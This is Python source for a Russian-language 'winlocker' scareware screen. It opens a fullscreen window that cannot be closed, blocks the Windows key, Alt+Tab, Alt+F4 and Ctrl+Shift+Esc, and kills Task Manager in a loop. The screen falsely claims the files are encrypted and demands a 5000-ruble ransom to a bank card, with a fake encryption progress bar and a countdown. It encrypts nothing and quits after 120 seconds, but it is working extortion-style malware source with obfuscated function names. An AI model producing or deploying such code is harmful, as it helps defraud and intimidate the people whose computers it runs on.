import tkinter as tk
import winsound as ws
import time as tm
import threading as thr
import ctypes as ct
import sys
import os
import subprocess as sproc
import random as rn
import string as sng

PASSWORD = "2012"
TIMER_SECONDS = 120

_alphabet = sng.ascii_letters + sng.digits

SESSION_ID = "_".join("".join(rn.choices(_alphabet, k=3)) for _ in range (3))

MESSAGE = f"""
!!! ВНИМАНИЕ !!!

Ваше устройство заражено вымогателем.
Все ваши файлы зашифрованы алгоритмом AES-256-RSA.

ID сессии: {SESSION_ID}

Для расшифровки необходимо оплатить выкуп: 
Сумма: 5000 RUB
Номер карты: 2204 3213 1594 8703

Срок: 48 часов. 
После этого ключ будет уничтожен.
"""
# Можно вводить пароль разблокировки, но зачем?

def a_1306_bk(): # Обфускация :) а вообще это block_keys
    try:
        import keyboard as kbd
        for key in ['windows', 'left windows', 'right windows']:
            kbd.block_key(key)
        kbd.add_hotkey('alt+tab', lambda: None, suppress=True)
        kbd.add_hotkey('alt+f4', lambda: None, suppress=True)
        kbd.add_hotkey('ctrl+esc', lambda: None, suppress=True)
        kbd.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    except: pass

def x_73a9_ktm(): # Убийство диспетчера задач
    while True:
        try:
            sproc.run(['taskkill', '/f', '/im', 'Taskmgr.exe'], capture_output=True, shell=True)
        except: pass
        tm.sleep(0.5)

def u_0f1a_pa(): # play_alarm
    for _ in range(3):
        try:
            ws.Beep(800, 200)
            ws.Beep(600, 200)
            ws.Beep(1000, 300)
            tm.sleep(0.1)
        except: pass

def i_13ef_m(): # main
    rt = tk.Tk()
    rt.title("RANSOMWARE")
    rt.attributes("-fullscreen", True)
    rt.attributes("-topmost", True)
    rt.config(bg="black")
    rt.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def h_e318_b(): # blink
        cur = rt.cget("bg")
        nc = "red" if cur == "black" else "black"
        rt.config(bg=nc)
        rt.after(500, h_e318_b)
    h_e318_b()
    
    frm = tk.Frame(rt, bg='black') # frame
    frm.pack(pady=10)
    
    msg = tk.Label(frm, text=MESSAGE, font=("Courier New", 16, "bold"), # message 
                   fg="white", bg="black", justify="left")
    msg.pack(pady=10)
    
    pl = tk.Label(frm, text="Шифрование файлов: 0%", font=("Arial", 14), # progress_label
                              fg="orange", bg="black")
    pl.pack(pady=5)
    
    def q_c0ca_up(): # update_progress
        for i in range(0, 101, 2):
            pl.config(text=f"Шифрование файлов: {i}%")
            tm.sleep(0.08)
        pl.config(text="Шифрование завершено", fg="red")
    thr.Thread(target=q_c0ca_up, daemon=True).start()
    
    tl = tk.Label(frm, text="Осталось: 02:00", font=("Arial", 16), fg="yellow", bg="black") # timer_label
    tl.pack(pady=5)
    
    def e_0f8b_ut(rmng): # update_timer(remaining)
        if rmng <= 0:
            tl.config(text="Время вышло! Ключ уничтожен.", fg="red")
            return
        mins = rmng // 60
        secs = rmng % 60
        tl.config(text=f"Осталось: {mins:02d}:{secs:02d}")
        rt.after(1000, e_0f8b_ut, rmng-1)
    e_0f8b_ut(TIMER_SECONDS)
    
    ent = tk.Entry(frm, font=("Arial", 20), show="*", justify="center", width=20, bg="gray10", fg="lime") # entry
    ent.pack(pady=10)
    ent.focus()

    rslt = tk.Label(frm, text="", font=("Arial", 16), fg="yellow", bg="black") # result
    rslt.pack()
    
    def k_078f_pw(): # pay_window
        pr = tk.Toplevel(rt) # pay_root
        pr.title("Оплата выкупа")
        pr.geometry("400x300")
        pr.config(bg="gray20")
        pr.attributes("-topmost", True)
        tk.Label(pr, text="Инструкция по оплате", font=("Arial", 16), fg="white", bg="gray20").pack(pady=20)
        tk.Label(pr, text="Переведите 5000 руб на карту\n2204 3213 1594 8703", font=("Arial", 14), fg="white", bg="gray20").pack()
        tk.Button(pr, text="Закрыть", command=pr.destroy).pack(pady=10)
        
    def v_7112_c(): # check
        if ent.get() == PASSWORD:
            rslt.config(text="Пароль верен! Разблокировка...", fg="lime")
            rt.after(500, rt.destroy)
        else:
            rslt.config(text="Неверный пароль", fg="orange")
            ent.delete(0, tk.END)

    btn_frm = tk.Frame(frm, bg='black')
    btn_frm.pack(pady=5)
    
    tk.Button(btn_frm, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 14), command=v_7112_c, bg="gray30", fg="white").pack(side="left", padx=10)
    tk.Button(btn_frm, text="ОПЛАТИТЬ ВЫКУП", font=("Arial", 14), command=k_078f_pw, bg="darkred", fg="white").pack(side="left", padx=10)

    # Блокировка Alt+F4 и Escape
    rt.bind('<Alt-F4>', lambda e: 'break')
    rt.bind('<Escape>', lambda e: 'break')

    # Автозакрытие
    def a_013b_ac(rmng):
        if rmng <= 0:
            rt.destroy()
            sys.exit(0)
        rt.title(f"Автозакрытие через {rmng} сек")
        rt.after(1000, a_013b_ac, rmng-1)
    rt.after(1000, a_013b_ac, TIMER_SECONDS)

    thr.Thread(target=u_0f1a_pa, daemon=True).start()
    thr.Thread(target=a_1306_bk, daemon=True).start()
    thr.Thread(target=x_73a9_ktm, daemon=True).start()

    rt.mainloop()

if __name__ == "__main__":
    print("ЗАПУСК ВИНЛОКЕРА")
    print("Автозакрытие через 120 сек")
    i_13ef_m()
    print("Разблокировано.")